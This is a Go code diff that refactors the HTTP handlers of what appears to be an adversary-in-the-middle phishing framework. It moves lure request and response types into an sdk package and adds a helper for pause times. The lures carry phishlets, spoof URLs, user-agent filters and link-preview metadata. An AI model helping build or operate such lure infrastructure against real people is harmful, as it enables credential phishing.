@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/travisbale/mirage/internal/aitm"
+	"github.com/travisbale/mirage/sdk"
 )
 
 func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
@@ -33,11 +34,11 @@ func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
 	end := min(start+limit, total)
 	page := filtered[start:end]
 
-	items := make([]LureResponse, len(page))
+	items := make([]sdk.LureResponse, len(page))
 	for i, l := range page {
 		items[i] = lureToResponse(l)
 	}
-	writeJSON(w, http.StatusOK, PaginatedResponse[LureResponse]{
+	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.LureResponse]{
 		Items:  items,
 		Total:  total,
 		Limit:  limit,
@@ -46,7 +47,7 @@ func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
 }
 
 func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
-	var body CreateLureRequest
+	var body sdk.CreateLureRequest
 	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
 		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
 		return
@@ -97,7 +98,7 @@ func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	var body UpdateLureRequest
+	var body sdk.UpdateLureRequest
 	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
 		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
 		return
@@ -158,7 +159,7 @@ func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	var body GenerateURLRequest
+	var body sdk.GenerateURLRequest
 	// Body is optional; ignore decode errors.
 	json.NewDecoder(req.Body).Decode(&body)
 
@@ -167,13 +168,13 @@ func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
 		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
 		return
 	}
-	writeJSON(w, http.StatusOK, GenerateURLResponse{URL: url})
+	writeJSON(w, http.StatusOK, sdk.GenerateURLResponse{URL: url})
 }
 
 func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
 
-	var body PauseLureRequest
+	var body sdk.PauseLureRequest
 	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
 		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
 		return
@@ -204,8 +205,8 @@ func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
 	writeJSON(w, http.StatusOK, lureToResponse(lure))
 }
 
-func lureToResponse(l *aitm.Lure) LureResponse {
-	return LureResponse{
+func lureToResponse(l *aitm.Lure) sdk.LureResponse {
+	return sdk.LureResponse{
 		ID:          l.ID,
 		Phishlet:    l.Phishlet,
 		BaseDomain:  l.BaseDomain,
@@ -214,13 +215,20 @@ func lureToResponse(l *aitm.Lure) LureResponse {
 		RedirectURL: l.RedirectURL,
 		SpoofURL:    l.SpoofURL,
 		UAFilter:    l.UAFilter,
-		PausedUntil: l.PausedUntil,
+		PausedUntil: pausedUntil(l),
 		OGTitle:     l.OGTitle,
 		OGDesc:      l.OGDesc,
 		OGImage:     l.OGImage,
 		OGURL:       l.OGURL,
 		Redirector:  l.Redirector,
 	}
+}
+
+func pausedUntil(l *aitm.Lure) *time.Time {
+	if l.PausedUntil.IsZero() {
+		return nil
+	}
+	return &l.PausedUntil
 }
 
 func randomPath() string {
